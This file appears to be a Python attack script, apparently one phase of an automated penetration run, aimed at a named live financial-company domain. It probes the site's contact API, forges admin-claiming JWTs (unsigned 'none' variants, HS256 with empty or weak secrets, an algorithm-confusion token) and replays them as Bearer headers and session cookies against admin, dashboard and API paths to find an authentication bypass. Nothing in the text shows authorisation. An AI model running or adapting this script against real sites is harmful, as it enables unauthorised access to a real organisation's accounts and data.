#!/usr/bin/env python3
"""JWT toolchain phase: obtain/weaponize tokens, run jwt_tool -M at, -X k, -X a,
and test forged/unsigned tokens against every protected surface on the target."""
import requests, json, subprocess, os, base64, time
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
s=requests.Session(); s.headers.update({"User-Agent":UA})

def b64u(d):
    if isinstance(d,str): d=d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def mkjwt(hdr,payload,secret="",alg="HS256"):
    h=b64u(json.dumps(hdr,separators=(',',':')))
    p=b64u(json.dumps(payload,separators=(',',':')))
    sig=""
    if alg.startswith("HS"):
        import hmac,hashlib
        raw=f"{h}.{p}".encode()
        algmap={"HS256":hashlib.sha256,"HS384":hashlib.sha384,"HS512":hashlib.sha512}
        sig=b64u(hmac.new(secret.encode(),raw,algmap[alg]).digest())
    return f"{h}.{p}.{sig}"

# ---- 1. discover real POST /api/send shape (the only dynamic backend endpoint) ----
shape=[{"fname":"JwtTest","lname":"Probe","cname":"C","email":"jwt.probe@infinitycapital.bh",
        "tel":"+97300000000","msgTxt":"jwt phase probe","description":"d","check":"1"},
       {"fname":"JwtTest","lname":"Probe","email":"jwt.probe@infinitycapital.bh",
        "message":"jwt phase probe"}]
print("### /api/send shape discovery")
ok_shape=None
for b in shape:
    r=s.post(B+"/api/send",json=b,timeout=30)
    print("  ",list(b)[:3],"->",r.status_code,len(r.content),r.text[:200])
    if r.status_code not in (404,405,500): ok_shape=b
    time.sleep(1)

# ---- 2. build tokens to weaponize ----
tokens={}
tokens["none_alg_admin"]=mkjwt({"alg":"none","typ":"JWT"},
    {"sub":"1","email":"admin@infinitycapital.bh","role":"admin","isAdmin":True,"iat":int(time.time()),"exp":int(time.time())+9999},"","none")
tokens["none_alg_varlen"]=mkjwt({"alg":"None","typ":"JWT"},
    {"sub":"1","role":"admin"},"","None")
tokens["none_alg_nOnE"]=mkjwt({"alg":"nOnE","typ":"JWT"},
    {"sub":"1","role":"admin"},"","nOnE")
tokens["hs256_empty_secret"]=mkjwt({"alg":"HS256","typ":"JWT"},
    {"sub":"1","email":"admin@infinitycapital.bh","role":"admin"},"")
tokens["hs256_secret"]=mkjwt({"alg":"HS256","typ":"JWT"},
    {"sub":"1","email":"admin@infinitycapital.bh","role":"admin"},"secret")
tokens["alg_confusion_rs256_as_hs256"]=mkjwt({"alg":"HS256","typ":"JWT"},
    {"sub":"1","role":"admin","user":"admin"}, "")
tokens["garbage"]="abc.def.ghi"
for k,v in tokens.items(): print("TOKEN",k,"=",v[:90],"...")

# ---- 3. does ANY endpoint accept/echo a bearer token? (auth-bypass oracle) ----
print("\n### Bearer token acceptance test across protected surfaces")
protected=["/","/api/send","/api/contact","/admin","/dashboard","/api/me","/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"]
for ep in protected:
    row=[]
    for k,tok in tokens.items():
        h={"Authorization":"Bearer "+tok}
        if "/api/send" in ep:
            r=s.post(B+ep,json=ok_shape or shape[0],headers=h,timeout=30)
        else:
            r=s.get(B+ep,headers=h,timeout=30)
        row.append(f"{k}:{r.status_code}/{len(r.content)}")
    print("  ",ep[:50],row)

# ---- 4. cookie-based session fixation / token in cookie ----
print("\n### Cookie-based auth probe")
for ck in ["session","token","jwt","auth","next-auth.session-token","__Secure-next-auth.session-token"]:
    s2=requests.Session(); s2.headers.update({"User-Agent":UA,"Cookie":f"{ck}={tokens['hs256_empty_secret']}"})
    r=s2.get(B+"/admin",timeout=25,allow_redirects=False)
    print(f"  cookie {ck}=<forged jwt> -> {r.status_code} loc={r.headers.get('location','')}")
